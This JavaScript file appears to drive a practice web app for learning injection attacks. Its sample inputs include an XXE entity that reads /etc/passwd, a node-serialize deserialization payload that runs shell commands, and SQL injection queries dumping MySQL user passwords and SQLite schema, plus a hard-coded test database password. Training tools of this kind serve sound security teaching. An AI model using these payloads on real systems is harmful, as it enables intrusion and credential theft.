function addSample(sampleName) {
    $("#InputArea").val(samples[sampleName]);
}

function addConfig(sampleName) {
    $("#HackConfig").val(config[sampleName]);
}

function showRef(testname, reftype) {
    window.open(refs[testname][reftype], `HackRefWin-${reftype}`);
}

function runProcessor(processor) {
    let indent = 0;
    if ($("#PrettifyOutput").prop("checked")) indent = 4;

    $("#OutputArea").val("");
    let inputData = $("#InputArea").val();
    let hackConfig = $("#HackConfig").val();
    restRunHackTool(processors[processor], inputData, hackConfig, function (data) {
        if (data !== null && data !== undefined) {
            $("#OutputArea").val(JSON.stringify(data, null, indent));
        } else $("#OutputArea").val(JSON.stringify("ERROR, review logs"));
    });
}

function switchTest() {
    let testname = $("#HackToolSel").val();
    console.info(`Switching test to ${testname}`);
    addSample(testname);
    addConfig(testname);
    $("#PrettifyLabel").prop("hidden", false);
    $("#PrettifyOutput").prop("hidden", false);
    $("#RunHack").prop("hidden", false);
    $("#HackHelp").prop("hidden", false);
    $("#DevHelp").prop("hidden", false);
    $("#GenHelp").prop("hidden", false);
    $("#HackConfig").prop("hidden", false);
}

function runTest() {
    let testname = $("#HackToolSel").val();
    if (testname !== null) {
        console.info(`Running test ${testname}`);
        runProcessor(testname);
    }
}

function showHackHelp() {
    let testname = $("#HackToolSel").val();
    if (testname !== null) {
        console.info(`Showing hacking help for test ${testname}`);
        showRef(testname, "hack");
    }
}

function showDevHelp() {
    let testname = $("#HackToolSel").val();
    if (testname !== null) {
        console.info(`Showing dev help for test ${testname}`);
        showRef(testname, "dev");
    }
}

function showGenHelp() {
    let testname = $("#HackToolSel").val();
    if (testname !== null) {
        console.info(`Showing generic help for test ${testname}`);
        showRef(testname, "gen");
    }
}

let samples = {
    xml: `<!DOCTYPE foo [<!ELEMENT foo ANY >
    <!ENTITY bar SYSTEM "file:///etc/passwd" >]>
    <products>
    <product> <name>PS3</name> <description>&bar;</description> </product>
    <product> <name>PS4</name> <description>Gaming Console</description> </product>
    </products>`,
    json: `{"msg":"See server log for RCE :-)","rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
    mysql: `SELECT table_schema,table_name,table_type FROM information_schema.tables UNION SELECT host,user,password from mysql.user;`,
    sqlite: `select "NORMAL_DATA" as "INPUT",Name,ArtistId,"" as Extra from artists where Name like "AC/%" and 1=1\nUNION select "SQLITE_VERSION", sqlite_version(),"",""\nUNION select "SQLITE_DATE", datetime('now','localtime'),"",""\nUNION select "SQLITE_TABLE",name,tbl_name,type from sqlite_master where type="table" ;\n\npragma module_list;\npragma database_list;\npragma function_list;\n`,
};

let config = {
    xml: `noent=true&noblanks=true`,
    json: ``,
    mysql: `host=localhost&user=tester&database=mysql&password=Passw0rd123`,
    sqlite: `dbFile=/app/utils/chinook.db`,
};

let processors = {
    xml: "xmlparser",
    json: "jsonparser",
    mysql: "mysql",
    sqlite: "sqlite",
};

let refs = {
    xml: {
        hack: "https://portswigger.net/web-security/xxe",
        dev: "https://www.npmjs.com/package/libxmljs",
        gen: "https://xmlwriter.net/xml_guide/entity_declaration.shtml",
        //owasp: "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
        //intro2: "https://www.w3schools.com/xml/xml_dtd_intro.asp",
    },
    json: {
        hack:
            "https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/",
        dev: "https://www.npmjs.com/package/node-serialize",
        gen:
            "https://github.com/appsecco/dvna/blob/master/docs/solution/a8-insecure-deserialization.md",
        //owasp: "",
    },
    mathjs: {
        hack:
            "https://github.com/appsecco/dvna/blob/master/docs/solution/a9-using-components-with-known-vulnerability.md",
        dev: "https://mathjs.org/docs/expressions/parsing.html",
        gen: "https://mathjs.org/docs/expressions/parsing.html",
    },
    mysql: {
        hack: "https://portswigger.net/web-security/sql-injection/cheat-sheet",
        dev: "https://www.npmjs.com/package/mysql",
        gen: "https://mariadb.com/kb/en/select/",
    },
    sqlite: {
        hack:
            "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md",
        dev: "https://www.npmjs.com/package/sqlite3",
        gen: "https://www.sqlitetutorial.net",
    },
};
